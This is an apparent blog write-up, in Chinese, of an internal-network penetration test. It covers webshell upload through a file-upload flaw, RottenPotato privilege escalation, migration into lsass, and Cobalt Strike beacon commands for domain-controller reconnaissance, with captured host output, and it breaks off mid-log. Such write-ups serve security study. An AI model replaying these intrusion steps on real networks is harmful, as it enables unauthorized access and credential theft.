{"title":"关于某次授权的大型内网渗透测试","uid":"6926437034a0cc884741b3438fbe3704","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","updated":"2023-05-25T09:23:15.776Z","comments":true,"path":"api/articles/关于某次授权的大型内网渗透测试.json","keywords":null,"cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F201508%2F04%2F20150804082536_YVK5n.thumb.1000_0.jpeg&refer=http%3A%2F%2Fc-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1687593990&t=86abed9188b13acd40e510f56ed95a01","content":"<p>接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。</p>\n<h1 id=\"背景：\"><a href=\"#背景：\" class=\"headerlink\" title=\"背景：\"></a>背景：</h1><p>接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。</p>\n<h1 id=\"前期渗透：\"><a href=\"#前期渗透：\" class=\"headerlink\" title=\"前期渗透：\"></a>前期渗透：</h1><h3 id=\"打点：（任意文件上传）\"><a href=\"#打点：（任意文件上传）\" class=\"headerlink\" title=\"打点：（任意文件上传）\"></a>打点：（任意文件上传）</h3><p>直接发现头像处任意文件上传，这里直接上传冰蝎即可。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c57d66dc50d7724af4dea1c84728496743e39a7c.png\" alt=\"image.png\"></p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c843e136c813fd9d30ef6d327b2ced52c4da36e7.png\" alt=\"image.png\"></p>\n<h5 id=\"tasklist查看杀软\"><a href=\"#tasklist查看杀软\" class=\"headerlink\" title=\"tasklist查看杀软\"></a>tasklist查看杀软</h5><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">System Idle Process              <span class=\"token number\">0</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nSystem                           <span class=\"token number\">4</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nsmss<span class=\"token operator\">.</span>exe                       <span class=\"token number\">240</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncsrss<span class=\"token operator\">.</span>exe                      <span class=\"token number\">376</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nwininit<span class=\"token operator\">.</span>exe                    <span class=\"token number\">436</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nservices<span class=\"token operator\">.</span>exe                   <span class=\"token number\">524</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nlsass<span class=\"token operator\">.</span>exe                      <span class=\"token number\">532</span> Kdc<span class=\"token punctuation\">,</span> KeyIso<span class=\"token punctuation\">,</span> Netlogon<span class=\"token punctuation\">,</span> <span class=\"token constant\">NTDS</span><span class=\"token punctuation\">,</span> SamSs          \nsvchost<span class=\"token operator\">.</span>exe                    <span class=\"token number\">672</span> BrokerInfrastructure<span class=\"token punctuation\">,</span> DcomLaunch<span class=\"token punctuation\">,</span> <span class=\"token constant\">LSM</span><span class=\"token punctuation\">,</span>      \n                                   PlugPlay<span class=\"token punctuation\">,</span> Power<span class=\"token punctuation\">,</span> SystemEventsBroker         \nsvchost<span class=\"token operator\">.</span>exe                    <span class=\"token number\">716</span> RpcEptMapper<span class=\"token punctuation\">,</span> RpcSs                         \n<span class=\"token constant\">WRSA</span><span class=\"token operator\">.</span>exe                       <span class=\"token number\">820</span> <span class=\"token constant\">WRSVC</span>                                       \nsvchost<span class=\"token operator\">.</span>exe                    <span class=\"token number\">276</span> Dhcp<span class=\"token punctuation\">,</span> EventLog<span class=\"token punctuation\">,</span> lmhosts<span class=\"token punctuation\">,</span> Wcmsvc             \nsvchost<span class=\"token operator\">.</span>exe                    <span class=\"token number\">320</span> Appinfo<span class=\"token punctuation\">,</span> <span class=\"token constant\">BITS</span><span class=\"token punctuation\">,</span> CertPropSvc<span class=\"token punctuation\">,</span> gpsvc<span class=\"token punctuation\">,</span> <span class=\"token constant\">IAS</span><span class=\"token punctuation\">,</span>     \n                                   <span class=\"token constant\">IKEEXT</span><span class=\"token punctuation\">,</span> iphlpsvc<span class=\"token punctuation\">,</span> LanmanServer<span class=\"token punctuation\">,</span> ProfSvc<span class=\"token punctuation\">,</span>    \n                                   Schedule<span class=\"token punctuation\">,</span> seclogon<span class=\"token punctuation\">,</span> <span class=\"token constant\">SENS</span><span class=\"token punctuation\">,</span> SessionEnv<span class=\"token punctuation\">,</span>       \n                                   ShellHWDetection<span class=\"token punctuation\">,</span> Themes<span class=\"token punctuation\">,</span> Winmgmt           \nsvchost<span class=\"token operator\">.</span>exe                    <span class=\"token number\">516</span> EventSystem<span class=\"token punctuation\">,</span> FontCache<span class=\"token punctuation\">,</span> netprofm<span class=\"token punctuation\">,</span> nsi<span class=\"token punctuation\">,</span>      \n                                   W32Time<span class=\"token punctuation\">,</span> WinHttpAutoProxySvc                \nsvchost<span class=\"token operator\">.</span>exe                    <span class=\"token number\">932</span> CryptSvc<span class=\"token punctuation\">,</span> Dnscache<span class=\"token punctuation\">,</span> LanmanWorkstation<span class=\"token punctuation\">,</span>      \n                                   NlaSvc<span class=\"token punctuation\">,</span> WinRM                               \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1100</span> <span class=\"token constant\">BFE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">DPS</span><span class=\"token punctuation\">,</span> MpsSvc                            \nspoolsv<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1508</span> Spooler                                     \nMicrosoft<span class=\"token operator\">.</span>ActiveDirectory     <span class=\"token number\">1540</span> <span class=\"token constant\">ADWS</span>                                        \nOfficeClickToRun<span class=\"token operator\">.</span>exe          <span class=\"token number\">1792</span> ClickToRunSvc                               \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1844</span> ddpvssvc                                    \ndfsrs<span class=\"token operator\">.</span>exe                     <span class=\"token number\">1892</span> <span class=\"token constant\">DFSR</span>                                        \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1908</span> DHCPServer                                  \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1936</span> DiagTrack                                   \ndns<span class=\"token operator\">.</span>exe                       <span class=\"token number\">1980</span> <span class=\"token constant\">DNS</span>                                         \nfmaonsite<span class=\"token operator\">.</span>exe                 <span class=\"token number\">2024</span> FMAuditOnsite                               \nismserv<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1340</span> IsmServ                                     \nMicrosoft<span class=\"token operator\">.</span><span class=\"token constant\">BDD</span><span class=\"token operator\">.</span>MonitorServ     <span class=\"token number\">1432</span> MDT_Monitor                                 \n<span class=\"token constant\">MSOIDSVC</span><span class=\"token operator\">.</span><span class=\"token constant\">EXE</span>                  <span class=\"token number\">2660</span> msoidsvc                                    \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">2328</span> Net Driver <span class=\"token constant\">HPZ12</span>                            \nOpenDNSAuditService<span class=\"token operator\">.</span>exe       <span class=\"token number\">2220</span> OpenDNS Active Directory Service            \n<span class=\"token constant\">MSOIDSVCM</span><span class=\"token operator\">.</span><span class=\"token constant\">EXE</span>                 <span class=\"token number\">1256</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">2172</span> Pml Driver <span class=\"token constant\">HPZ12</span>                   \nScreenConnect<span class=\"token operator\">.</span>ClientServi      <span class=\"token number\">556</span> ScreenConnect <span class=\"token function\">Client</span> <span class=\"token punctuation\">(</span><span class=\"token number\">62</span>c0d7e1d3b94bc5<span class=\"token punctuation\">)</span>     \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1472</span> TermService                                 \nOpenDNSAuditClient<span class=\"token operator\">.</span>exe        <span class=\"token number\">2924</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1380</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nVGAuthService<span class=\"token operator\">.</span>exe             <span class=\"token number\">2096</span> VGAuthService                               \nvmtoolsd<span class=\"token operator\">.</span>exe                   <span class=\"token number\">612</span> VMTools                                     \nWRCoreService<span class=\"token operator\">.</span>x64<span class=\"token operator\">.</span>exe         <span class=\"token number\">2136</span> WRCoreService                               \nWRSkyClient<span class=\"token operator\">.</span>x64<span class=\"token operator\">.</span>exe           <span class=\"token number\">3180</span> WRSkyClient                                 \ndfssvc<span class=\"token operator\">.</span>exe                    <span class=\"token number\">3316</span> Dfs                                         \nWmiPrvSE<span class=\"token operator\">.</span>exe                  <span class=\"token number\">3484</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">3568</span> <span class=\"token constant\">UALSVC</span><span class=\"token punctuation\">,</span> UmRdpService                        \nVeeamDeploymentSvc<span class=\"token operator\">.</span>exe        <span class=\"token number\">3612</span> VeeamDeploySvc                              \nWRSvcMetrics<span class=\"token operator\">.</span>x64<span class=\"token operator\">.</span>exe          <span class=\"token number\">3580</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nsvchost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">4216</span> PolicyAgent                                 \nmsdtc<span class=\"token operator\">.</span>exe                     <span class=\"token number\">4160</span> <span class=\"token constant\">MSDTC</span>                                       \n<span class=\"token constant\">DCA</span><span class=\"token operator\">.</span>Edge<span class=\"token operator\">.</span>Console<span class=\"token operator\">.</span>exe          <span class=\"token number\">3676</span> DCAPulse                                    \niashost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">4548</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nwsmprovhost<span class=\"token operator\">.</span>exe               <span class=\"token number\">9104</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \npowershell<span class=\"token operator\">.</span>exe                <span class=\"token number\">7828</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">6688</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \npowershell<span class=\"token operator\">.</span>exe                 <span class=\"token number\">360</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">5152</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnotepad<span class=\"token operator\">.</span>exe                   <span class=\"token number\">1760</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nLTSvcMon<span class=\"token operator\">.</span>exe                  <span class=\"token number\">5424</span> LTSvcMon                                    \n<span class=\"token constant\">LTSVC</span><span class=\"token operator\">.</span>exe                     <span class=\"token number\">7272</span> LTService                                   \nlabvnc<span class=\"token operator\">.</span>exe                    <span class=\"token number\">5412</span> tvnserver                                   \nVeeam<span class=\"token operator\">.</span>EndPoint<span class=\"token operator\">.</span>Service<span class=\"token operator\">.</span>ex     <span class=\"token number\">8316</span> VeeamEndpointBackupSvc                      \nwsmprovhost<span class=\"token operator\">.</span>exe               <span class=\"token number\">7108</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nScreenConnect<span class=\"token operator\">.</span>WindowsBack     <span class=\"token number\">4384</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncsrss<span class=\"token operator\">.</span>exe                     <span class=\"token number\">7564</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nwinlogon<span class=\"token operator\">.</span>exe                  <span class=\"token number\">5520</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ndwm<span class=\"token operator\">.</span>exe                       <span class=\"token number\">6572</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nlabvnc<span class=\"token operator\">.</span>exe                    <span class=\"token number\">5916</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ntaskhostex<span class=\"token operator\">.</span>exe                <span class=\"token number\">8540</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \n<span class=\"token constant\">WRSA</span><span class=\"token operator\">.</span>exe                      <span class=\"token number\">2308</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nScreenConnect<span class=\"token operator\">.</span>WindowsClie     <span class=\"token number\">3732</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nexplorer<span class=\"token operator\">.</span>exe                  <span class=\"token number\">3964</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \n<span class=\"token constant\">MRT</span><span class=\"token operator\">.</span>exe                       <span class=\"token number\">4852</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nvm3dservice<span class=\"token operator\">.</span>exe               <span class=\"token number\">2656</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \n<span class=\"token constant\">MRT</span><span class=\"token operator\">.</span>exe                       <span class=\"token number\">5196</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nvmtoolsd<span class=\"token operator\">.</span>exe                  <span class=\"token number\">5340</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \n<span class=\"token constant\">DCA</span><span class=\"token operator\">.</span>Edge<span class=\"token operator\">.</span>TrayIcon<span class=\"token operator\">.</span>exe         <span class=\"token number\">6432</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nLTTray<span class=\"token operator\">.</span>exe                    <span class=\"token number\">4564</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nWmiPrvSE<span class=\"token operator\">.</span>exe                  <span class=\"token number\">6336</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nTaskmgr<span class=\"token operator\">.</span>exe                   <span class=\"token number\">6684</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nLogonUI<span class=\"token operator\">.</span>exe                    <span class=\"token number\">380</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncmd<span class=\"token operator\">.</span>exe                       <span class=\"token number\">2400</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">6216</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet<span class=\"token operator\">.</span>exe                       <span class=\"token number\">8100</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet1<span class=\"token operator\">.</span>exe                      <span class=\"token number\">8908</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncmd<span class=\"token operator\">.</span>exe                       <span class=\"token number\">2956</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">8300</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet<span class=\"token operator\">.</span>exe                       <span class=\"token number\">7344</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet1<span class=\"token operator\">.</span>exe                      <span class=\"token number\">5248</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncmd<span class=\"token operator\">.</span>exe                        <span class=\"token number\">432</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">9052</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet<span class=\"token operator\">.</span>exe                       <span class=\"token number\">7356</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet1<span class=\"token operator\">.</span>exe                      <span class=\"token number\">3156</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncmd<span class=\"token operator\">.</span>exe                       <span class=\"token number\">8232</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">4600</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet<span class=\"token operator\">.</span>exe                       <span class=\"token number\">5528</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nnet1<span class=\"token operator\">.</span>exe                      <span class=\"token number\">7352</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ncmd<span class=\"token operator\">.</span>exe                       <span class=\"token number\">4304</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">7148</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nvds<span class=\"token operator\">.</span>exe                       <span class=\"token number\">3872</span> vds                                         \ncmd<span class=\"token operator\">.</span>exe                       <span class=\"token number\">7716</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \nconhost<span class=\"token operator\">.</span>exe                   <span class=\"token number\">8564</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>                                         \ntasklist<span class=\"token operator\">.</span>exe                  <span class=\"token number\">9212</span> <span class=\"token constant\">N</span><span class=\"token operator\">/</span><span class=\"token constant\">A</span>   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"内网渗透：\"><a href=\"#内网渗透：\" class=\"headerlink\" title=\"内网渗透：\"></a>内网渗透：</h1><h5 id=\"边缘机的systeminfo\"><a href=\"#边缘机的systeminfo\" class=\"headerlink\" title=\"边缘机的systeminfo\"></a>边缘机的systeminfo</h5><p>因为前期拿到了边缘机，这里查看systeminfo,发现是2012R2的主机。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-2bf1786032621166c799a81a5c34b94ceab30888.png\" alt=\"image.png\"></p>\n<h5 id=\"边缘机提权：（利用烂土豆直接提上权限）\"><a href=\"#边缘机提权：（利用烂土豆直接提上权限）\" class=\"headerlink\" title=\"边缘机提权：（利用烂土豆直接提上权限）\"></a>边缘机提权：（利用烂土豆直接提上权限）</h5><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0a596057f83ac07edcc54b6fdc719824ad3e1358.png\" alt=\"image.png\"><br>提权之后做进程迁移，直接把进程迁移到lsass进程中去。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-5deba4837c05ddbdbb954bc0aee0383e3da0dbde.png\" alt=\"image.png\"></p>\n<h3 id=\"内网信息收集：\"><a href=\"#内网信息收集：\" class=\"headerlink\" title=\"内网信息收集：\"></a>内网信息收集：</h3><h5 id=\"先查看ip，看是否存在双网卡机\"><a href=\"#先查看ip，看是否存在双网卡机\" class=\"headerlink\" title=\"先查看ip，看是否存在双网卡机\"></a>先查看ip，看是否存在双网卡机</h5><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Windows <span class=\"token constant\">IP</span> Configuration\n\n   Host Name <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token constant\">CAMS</span><span class=\"token operator\">-</span><span class=\"token constant\">SQL3</span>\n   Primary Dns Suffix  <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token constant\">AVV</span><span class=\"token operator\">.</span>org\n   Node Type <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> Hybrid\n   <span class=\"token constant\">IP</span> Routing Enabled<span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> No\n   <span class=\"token constant\">WINS</span> Proxy Enabled<span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> No\n   <span class=\"token constant\">DNS</span> Suffix Search <span class=\"token keyword\">List</span><span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token constant\">AVV</span><span class=\"token operator\">.</span>org\n\nEthernet adapter Ethernet<span class=\"token punctuation\">:</span>\n\n   Connection<span class=\"token operator\">-</span>specific <span class=\"token constant\">DNS</span> Suffix  <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> \n   Description <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> vmxnet3 Ethernet Adapter\n   Physical Address<span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">00</span><span class=\"token operator\">-</span><span class=\"token number\">50</span><span class=\"token operator\">-</span><span class=\"token number\">56</span><span class=\"token operator\">-</span><span class=\"token number\">98</span><span class=\"token operator\">-</span><span class=\"token constant\">E3</span><span class=\"token operator\">-</span><span class=\"token constant\">D6</span>\n   <span class=\"token constant\">DHCP</span> Enabled<span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> No\n   Autoconfiguration Enabled <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> Yes\n   Link<span class=\"token operator\">-</span>local IPv6 Address <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token class-name static-context\">fe80</span><span class=\"token operator\">::</span><span class=\"token constant\">a5b1</span><span class=\"token punctuation\">:</span>d534<span class=\"token punctuation\">:</span><span class=\"token number\">730</span><span class=\"token punctuation\">:</span><span class=\"token number\">3123</span><span class=\"token operator\">%</span><span class=\"token number\">11</span><span class=\"token punctuation\">(</span>Preferred<span class=\"token punctuation\">)</span> \n   IPv4 Address<span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">10.2</span><span class=\"token number\">.0</span><span class=\"token number\">.49</span><span class=\"token punctuation\">(</span>Preferred<span class=\"token punctuation\">)</span> \n   Subnet Mask <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">255.255</span><span class=\"token number\">.254</span><span class=\"token number\">.0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"进行域管理员和域控的查看：\"><a href=\"#进行域管理员和域控的查看：\" class=\"headerlink\" title=\"进行域管理员和域控的查看：\"></a>进行域管理员和域控的查看：</h5><h6 id=\"域控：\"><a href=\"#域控：\" class=\"headerlink\" title=\"域控：\"></a>域控：</h6><p>net group “domain controllers” &#x2F;domain</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token number\">59</span><span class=\"token punctuation\">]</span> beacon<span class=\"token operator\">></span> shell net group <span class=\"token string double-quoted-string\">\"domain Controllers\"</span> <span class=\"token operator\">/</span>domain\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">17</span><span class=\"token punctuation\">:</span><span class=\"token number\">00</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Tasked beacon to run<span class=\"token punctuation\">:</span> net group <span class=\"token string double-quoted-string\">\"domain Controllers\"</span> <span class=\"token operator\">/</span>domain\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">17</span><span class=\"token punctuation\">:</span><span class=\"token number\">00</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> host called home<span class=\"token punctuation\">,</span> <span class=\"token argument-name\">sent</span><span class=\"token punctuation\">:</span> <span class=\"token number\">69</span> bytes\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">17</span><span class=\"token punctuation\">:</span><span class=\"token number\">00</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> received output<span class=\"token punctuation\">:</span>\nThe request will be processed at a domain controller <span class=\"token keyword\">for</span> domain 